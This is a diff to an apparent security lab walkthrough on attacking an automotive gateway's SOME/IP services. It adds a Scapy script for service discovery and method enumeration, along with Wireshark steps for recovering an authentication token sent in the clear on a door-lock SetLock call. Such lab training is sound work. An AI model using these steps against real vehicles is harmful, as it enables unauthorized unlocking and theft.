@@ -165,7 +165,7 @@ nmap -sU -p 30000-30600 192.168.2.1
 # 30510/udp open|filtered
 ```
 
-![[AUTO-01-nmap.png]]
+![[Canary/Vulns/Automotive/images/AUTO-01-nmap.png]]
 
 UDP scans are unreliable, a silent service reads as `open|filtered`, so treat these as candidates and confirm each by talking to it. A SOME/IP service answers a well-formed request and ignores noise, which is itself a fingerprint.
 
@@ -188,6 +188,10 @@ Each lock or unlock is one authenticated `SetLock` on the wire. The capture hand
 ```
 -> OfferService: service 0x1401, instance 0x0001, endpoint 192.168.2.1:30509/UDP
 ```
+
+You do not need the firmware to craft that `FindService`. SOME/IP and its Service Discovery are a public AUTOSAR standard, so the header layout and the SD message (service `0xFFFF`, method `0x8100`, with its entry and option format) come straight from the AUTOSAR SOME/IP and SOME/IP-SD specifications. Off-the-shelf tools already speak them: Scapy ships `scapy.contrib.automotive.someip`, and `vsomeip` (the open-source COVESA stack) does the SD handshake natively. The hand-rolled snippets in this walkthrough are only the minimal form of what those tools do, and even without the spec a single captured SOME/IP frame is enough because Wireshark labels every field.
+
+What no specification can give you is this ECU's own values, the service id `0x1401`, its methods and the token. Those are discovered, not guessed: from the `OfferService` reply, from sniffed traffic, or from the error-code enumeration below. In a production vehicle it is easier still, SD is multicast and continuous, so an attacker recovers the whole service catalog just by listening. The lab ships only the `FindService` responder, so here you send the query, which models that active-discovery step.
 
 **Active enumeration (no traffic and no SD to observe).** A SOME/IP header is a fixed 16-byte layout: a 32-bit Message ID (`service << 16 | method`), a length, a Request ID, then protocol, interface, message-type and return-code bytes. Wireshark decodes it directly. To confirm `30509` and see what lives there, send a minimal request and read the header back:
 
@@ -226,6 +230,45 @@ print('setlock ->', hex(s.recvfrom(1024)[0][14]))   # -> 0x81 (ERROR)
 ```
 
 Still rejected, for every argument. A setter that refuses everything is authenticated, there is a credential in the request you do not have, though if you sniffed traffic above you already have it. The standard return codes make the sweep precise: `0x0003` answers `E_MALFORMED`, so it exists and wants a longer payload, you just do not yet know what it does. Service ids enumerate the same way, a wrong service answers `E_UNKNOWN_SERVICE`. Note the second port `30510` from Phase 1. What `0x0003` relays, the firmware format, and the CAN map are the semantic layer, which you get by correlating captures with CAN traffic or from static analysis (Phase 3).
+
+**Doing Phase 2 with real tools (Scapy + Wireshark).** The snippets above show the raw bytes, but in practice you send with Scapy and read with Wireshark, and neither needs the firmware. Scapy is preinstalled on Kali (otherwise `pip install scapy`), and its `scapy.contrib.automotive.someip` layer speaks SOME/IP and SOME/IP-SD directly. The following is verified against this lab:
+
+```python
+from scapy.contrib.automotive.someip import SOMEIP, SD, SDEntry_Service
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
+
+# 1) Service Discovery: a FindService for service 0x1401 -> the gateway answers OfferService
+entry = SDEntry_Service(type=0, srv_id=0x1401, inst_id=0xFFFF, major_ver=0xFF, ttl=3, minor_ver=0xFFFFFFFF)
+find = SOMEIP(srv_id=0xFFFF, sub_id=0x8100, msg_type=2) / SD(flags=0xC0, entry_array=[entry])
+s.sendto(bytes(find), ('192.168.2.1', 30490))
+SOMEIP(s.recvfrom(1024)[0]).show()      # OfferService: service 0x1401 @ 192.168.2.1:30509/UDP
+
+# 2) Method enumeration on the service port, read the standard return codes
+for m in (0x0001, 0x0002, 0x0003, 0x00ff):
+    s.sendto(bytes(SOMEIP(srv_id=0x1401, sub_id=m, msg_type=0)), ('192.168.2.1', 30509))
+    r = SOMEIP(s.recvfrom(1024)[0])
+    print(f'method {m:#06x} -> msg_type={r.msg_type} retcode={r.retcode}')
+# 0x0001 -> 129/1  ERROR / E_NOT_OK (authenticated)     0x0002 -> 128/0  RESPONSE (readable)
+# 0x0003 -> 129/9  ERROR / E_MALFORMED (exists)          0x00ff -> 129/3  ERROR / E_UNKNOWN_METHOD
+```
+
+`SOMEIP(...).show()` prints the fields by name (`msg_type` as `NOTIFICATION` / `RESPONSE` / `ERROR`, `retcode` as `E_OK` / `E_NOT_OK` / `E_MALFORMED_MESSAGE` / `E_UNKNOWN_METHOD`), and the OfferService reply already carries the service id and the IPv4 endpoint option, so Scapy alone hands you service `0x1401` at `192.168.2.1:30509`.
+
+To read a frame in Wireshark:
+
+1. Capture on the interface facing the vehicle with `udp.port in {30490,30509,30510}`, or open the saved `.pcap`.
+2. Wireshark has a SOME/IP dissector but it is off for these non-standard ports. Right-click one of the packets, choose `Decode As...`, and set the UDP port (`30509`, `30510`, `30490`) to `SOMEIP`. The SD messages on `30490` get the SOME/IP-SD sub-dissection on their own.
+3. The detail pane now shows the fields by name under `SOME/IP Protocol`: `Service ID`, `Method ID`, `Message Type`, `Return Code`, and the payload, with no hex arithmetic.
+4. On an `OfferService`, expand `SOME/IP Service Discovery` and read the entry (service `0x1401`) and the IPv4 endpoint option (`192.168.2.1`, port `30509`, UDP).
+5. On the authenticated `SetLock` you sniffed, select the SOME/IP payload and read the ASCII in the bytes pane, `AGL-HEADUNIT-7c2f`, the token in the clear.
+6. Useful display filters: `someip.serviceid == 0x1401`, `someip.messagetype == 0x81` (only the error replies of the sweep), `someip.methodid == 3` (RelayFrame), `someipsd.entry.serviceid == 0x1401` (the SD offer).
+
+![[AUTO-01-wireshark-find-offer.png]]
+
+![[AUTO-01-discovery-protocol.png]]
+
+![[AUTO-01-service-id.png]]
 
 ### Phase 3 - Static analysis: recover the design from the firmware
 
